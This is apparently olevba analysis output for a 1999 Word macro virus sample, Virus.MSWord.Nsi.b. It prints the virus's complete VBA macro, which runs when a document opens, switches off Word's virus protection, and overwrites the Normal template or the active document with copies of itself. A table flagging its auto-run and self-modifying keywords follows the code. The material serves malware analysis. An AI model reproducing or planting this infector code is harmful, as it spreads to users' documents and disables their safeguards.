olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nsi.b-e4d2a5ece8a0d5c3ef929b5ceb6b6e8a92c39851
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nsi.b-e4d2a5ece8a0d5c3ef929b5ceb6b6e8a92c39851 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_open()
On Error Resume Next
Options.VirusProtection = 0: EnableCancelKey = 0
Set maci = MacroContainer.VBProject.vbComponents.Item(1)
Set macic = maci.codemodule
ns$ = Left(macic.lines(1, 1), 21)
Set inf = NormalTemplate: nsi$ = ns$ + "close"
If MacroContainer = inf Then Set inf = ActiveDocument: nsi$ = ns$ + "open"
Set infc = inf.VBProject.vbComponents
Set infi = infc.Item(1)
Set infic = infi.codemodule
For mx = 2 To infc.Count: infc.Remove infc.Item(2): Next mx
infic.deletelines 1, infic.countoflines
infic.addfromstring macic.lines(1, 17) 'count of lines!
infic.replaceline 1, nsi$
If Left(ActiveDocument.Name, 8) <> Mid$(macic.lines(1, 1), 13, 8) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'Psycode v1.0 1999
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

